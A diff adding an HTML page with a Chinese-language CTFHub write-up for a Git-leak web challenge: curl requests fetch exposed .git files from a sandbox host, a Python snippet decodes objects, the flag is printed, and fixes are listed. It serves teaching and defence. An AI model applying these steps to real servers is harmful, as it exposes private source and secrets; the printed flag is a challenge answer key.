@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub Git泄露 #2 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 信息泄露 - Git泄露 #2</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 信息泄露</span>
+            <span class="tag"># Git</span>
+            <span class="tag"># loose object</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>Git泄露</li>
+            <li><strong>题目方向：</strong>Web - 信息泄露</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目提示：</strong>网站使用 Git 进行版本控制；如果部署配置不当，线上的 <code>.git</code> 目录可能被直接公开。</li>
+            <li><strong>题目目标：</strong>获取泄露的 Git 对象，恢复源码并定位 flag。</li>
+        </ul>
+
+        <h2>二、漏洞原理</h2>
+        <p>Git 仓库中的 <code>.git</code> 目录保存引用、配置、提交历史和对象数据库。如果发布网站时直接部署整个项目目录，且 Web 服务器没有拦截点开头的隐藏目录，攻击者就能访问 <code>/.git/HEAD</code>、<code>/.git/refs/</code> 和 <code>/.git/objects/</code>。</p>
+        <p>Git 的 loose object 以 zlib 压缩形式存放在 <code>.git/objects/&lt;前2位&gt;/&lt;后38位&gt;</code>。从 <code>HEAD</code> 开始依次解析 commit、tree 和 blob，即可恢复仓库文件。即使敏感文件已从最新版本删除，也可能保留在历史对象中。</p>
+
+        <h2>三、探测泄露</h2>
+        <p>访问首页和 <code>/.git/HEAD</code>：</p>
+        <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/"
+curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"</pre>
+        <p><code>HEAD</code> 返回了有效引用，说明仓库目录可被公开访问：</p>
+        <pre>HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+
+ref: refs/heads/master</pre>
+
+        <h2>四、读取提交与引用</h2>
+        <p>读取 <code>master</code> 引用和提交日志：</p>
+        <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
+curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/logs/HEAD"</pre>
+        <p>本轮环境中，<code>master</code> 指向的最新提交为：</p>
+        <pre>d09b828f50d28343cbafa211d380fdcbf310e3bf</pre>
+        <p>提交日志显示共有两次提交，第二次提交说明为 <code>add flag</code>：</p>
+        <pre>fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0  init
+d09b828f50d28343cbafa211d380fdcbf310e3bf  add flag</pre>
+        <p>请求 Git smart HTTP 接口时返回 <code>404 Not Found</code>，因此不能直接执行 <code>git clone</code>，需要按对象哈希逐个恢复：</p>
+        <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/info/refs?service=git-upload-pack"</pre>
+
+        <h2>五、恢复 Git 对象</h2>
+        <p>下载并解压 commit 对象后，可以取得对应的 tree：</p>
+        <pre>commit d09b828f50d28343cbafa211d380fdcbf310e3bf
+tree   55e6b59cf68599f3134d2bc116ae52286f246c88
+parent fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0</pre>
+        <p>继续读取 tree 对象 <code>55e6b59c...</code>，解析出三个文件：</p>
+        <pre>100644 49f04c9d7f959d70742a30b2593508210055eadb 34061640727815.txt
+100644 9071e0a24f654c88aa97a2273ca595e301b7ada5 50x.html
+100644 2c59e3024e3bc350976778204928a21d9ff42d01 index.html</pre>
+        <p>随机数字命名的文本文件最可疑。下载 blob <code>49f04c9d...</code>，使用 zlib 解压，并跳过 Git 的 <code>blob 33\0</code> 头部：</p>
+        <pre>import zlib
+
+raw = open("49f04c9d7f959d70742a30b2593508210055eadb", "rb").read()
+header, payload = zlib.decompress(raw).split(b"\0", 1)
+print(payload.decode())</pre>
+        <p>文件 <code>34061640727815.txt</code> 的内容为：</p>
+        <pre>ctfhub{153e312eea594df4c4b9483e}</pre>
+
+        <div class="note">
+            若目标允许 Git dumb HTTP 或工具能够自动发现对象，也可以使用 BugScanTeam 的 GitHack。Git smart HTTP 被禁用且只暴露 loose object 时，按 commit → tree → blob 的关系手动下载是最直接的方法。
+        </div>
+
+        <h2>六、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{153e312eea594df4c4b9483e}
+        </div>
+
+        <h2>七、修复建议</h2>
+        <ul>
+            <li>禁止 Web 服务器访问 <code>.git</code>、<code>.svn</code>、<code>.hg</code> 等版本控制目录。</li>
+            <li>部署时只发布构建产物，不要将开发仓库或完整源码目录直接暴露到 Web 根目录。</li>
+            <li>使用 Nginx 或 Apache 显式拦截以点开头的隐藏文件和敏感路径。</li>
+            <li>若密钥、密码或 flag 曾进入 Git 历史，仅删除当前文件并不安全，应立即轮换凭证并清理历史对象。</li>
+        </ul>
+
+        <h2>八、解题总结</h2>
+        <p>本题的关键是确认 <code>.git</code> 泄露后，从 <code>refs/heads/master</code> 定位最新 commit，再解析 commit、tree 和 blob。即使服务端禁用了 <code>git clone</code> 所需的 smart HTTP，只要 loose object 可下载，就能完整恢复仓库内容并取得 flag。</p>
+    </div>
+</body>
+</html>
